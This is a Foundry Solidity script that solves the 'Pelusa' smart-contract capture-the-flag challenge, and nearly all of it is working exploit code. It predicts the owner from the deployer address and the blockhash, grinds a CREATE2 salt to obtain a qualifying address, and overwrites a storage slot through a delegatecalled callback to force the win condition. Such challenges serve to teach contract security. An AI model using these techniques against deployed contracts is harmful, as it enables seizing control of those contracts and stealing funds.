// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Script.sol";
import "../src/ChallengePelusa.sol";

contract PelusaScript is Script {
    function run(
        address _pelusaAddr,
        address _pelusaDeployer,
        uint256 _blockNumberOfDeployment
    ) external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        Pelusa pelusa = Pelusa(_pelusaAddr);

        // 1. Deploy PelusaBruteforcer
        PelusaBruteforcer pelusaBruteforcer = new PelusaBruteforcer();

        // 2. Use PelusaBruteforcer to solve challenge
        pelusaBruteforcer.solve(
            pelusa,
            _pelusaDeployer,
            _blockNumberOfDeployment
        );

        // Check attack success
        require(pelusa.goals() == 2, "NOT SOLVED");
        vm.stopBroadcast();
    }
}

/**
@dev This contract is responsible for solving the challenge
 */
contract PelusaBruteforcer {
    function solve(
        Pelusa _pelusa,
        address _pelusaDeployer,
        uint256 _blockNumberOfDeployment
    ) external {
        // Calculate the `owner` set in Pelusa with the challenge deployer and block number of deployment
        address pelusaOwner = _calculatePelusaOwner(
            _pelusaDeployer,
            _blockNumberOfDeployment
        );

        // Deploy PelusaCracker at correct address that passes checks
        bytes32 salt = _calculateCreate2Salt(0, 1000, _pelusa, pelusaOwner);
        PelusaCracker pelusaCracker = new PelusaCracker{salt: salt}(
            _pelusa,
            pelusaOwner
        );

        // Set goal to 2 using PelusaCracker
        pelusaCracker.goal();

        selfdestruct(payable(msg.sender));
    }

    /////////////
    // HELPERS //
    /////////////

    /**
    @dev Checks if PelusaCracker's address is correct (correct = passes address checks)
     */
    function _isAddressCorrect(address _pelusaCrackerAddr)
        internal
        pure
        returns (bool)
    {
        return uint256(uint160(_pelusaCrackerAddr)) % 100 == 10;
    }

    /**
    @dev Calculates Pelusa's owner from certain parameters
     */
    function _calculatePelusaOwner(
        address _pelusaDeployer,
        uint256 _blockNumberOfDeployment
    ) internal view returns (address pelusaOwner) {
        pelusaOwner = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            _pelusaDeployer,
                            blockhash(_blockNumberOfDeployment)
                        )
                    )
                )
            )
        );
    }

    /**
    @dev Calculates salt needed to deploy PelusaCracker at the correct address
     */
    function _calculateCreate2Salt(
        uint256 _lowSalt,
        uint256 _highSalt,
        Pelusa _pelusa,
        address _pelusaOwner
    ) internal view returns (bytes32) {
        uint256 saltCurr;
        bytes32 bytecodeHashed = keccak256(
            abi.encodePacked(
                type(PelusaCracker).creationCode,
                abi.encode(address(_pelusa), _pelusaOwner)
            )
        );

        bytes32 saltCurrBytes32;
        for (saltCurr = _lowSalt; saltCurr <= _highSalt; saltCurr++) {
            saltCurrBytes32 = bytes32(saltCurr);

            bytes32 hash = keccak256(
                abi.encodePacked(
                    bytes1(0xff),
                    address(this),
                    saltCurrBytes32,
                    bytecodeHashed
                )
            );
            address create2Addr = address(uint160(uint256(hash)));

            if (_isAddressCorrect(create2Addr)) {
                // Match found
                return saltCurrBytes32;
            }
        }

        revert("SALT NOT FOUND");
    }
}

/**
@dev This contract is responsible for manipulating goal
 */
contract PelusaCracker {
    address existingOwner;
    Pelusa pelusa;

    constructor(Pelusa _pelusa, address _existingOwner) {
        // Store params
        pelusa = _pelusa;
        existingOwner = _existingOwner;

        // Become `player` by passing the ball
        _pelusa.passTheBall();
    }

    /**
    @dev Called by Pelusa to check for owner
     */
    function getBallPossesion() external view returns (address) {
        return existingOwner;
    }

    /**
    @dev Call to change goals in Pelusa
     */
    function goal() external {
        pelusa.shoot();
        selfdestruct(payable(msg.sender));
    }

    /**
    @dev Called by Pelusa during `shoot()` call to get a number
     */
    function handOfGod() external returns (uint256 numberToReturn) {
        // Change number of goals
        assembly {
            sstore(1, 0x02)
        }

        // Return number needed
        numberToReturn = 22_06_1986;
    }
}
